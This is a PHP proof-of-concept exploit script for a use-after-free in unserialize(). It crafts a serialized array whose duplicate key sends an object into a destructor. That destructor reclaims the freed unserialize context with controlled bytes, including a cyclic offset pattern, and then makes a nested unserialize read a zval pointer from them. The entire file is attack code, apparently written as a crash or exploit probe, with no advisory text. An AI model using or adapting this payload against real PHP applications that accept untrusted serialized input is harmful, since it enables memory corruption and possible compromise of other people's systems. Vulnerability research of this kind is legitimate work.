<?php
// The destructor runs inside var_destroy's dtor walk, with the outer unserialize() context already freed.
// Allocating here is the reclaim attempt; unserialize('R:...') then reads a zval pointer out of whatever
// now occupies the freed block.
class Reclaim {
    public function __destruct() {
$GLOBALS['buffer'] = filler($GLOBALS['fill'], $GLOBALS['len']);   // reclaim attempt, contents known
        $r = @unserialize($GLOBALS['ref']);                      // read a zval* out of the reclaimed bytes
        echo "inner returned\n";
    }
}

$GLOBALS['len'] = (int)($argv[1] ?? 8159);
$GLOBALS['ref'] = $argv[2] ?? 'R:1021;';
$GLOBALS['fill'] = $argv[3] ?? 'B';
$GLOBALS['buffer'] = null;

// 'PAT' fills with a repeating 0..255 cycle, so the eight bytes that end up as a pointer encode the
// offset they were read from: value byte k = (offset + k) & 0xFF.
function filler(string $spec, int $len): string {
    if ($spec !== 'PAT') {
        return str_repeat($spec === '' ? 'B' : $spec, $len);
    }
    $cycle = '';
    for ($i = 0; $i < 256; $i++) { $cycle .= chr($i); }
    return substr(str_repeat($cycle, intdiv($len, 256) + 1), 0, $len);
}

$parts = [];
for ($k = 0; $k <= 1017; $k++) {
    $parts[] = "i:$k;i:1;";
}
$parts[] = 'i:9998;O:7:"Reclaim":0:{}';
$parts[] = 'i:9998;i:5;';          // duplicate key: moves the object into a destructor slot
$payload = 'a:1020:{' . implode('', $parts) . '}';

echo "len=", $GLOBALS['len'], " payload=", strlen($payload), "\n";
$result = unserialize($payload);
echo "SURVIVED len=", $GLOBALS['len'], " outer=", var_export($result !== false, true), "\n";
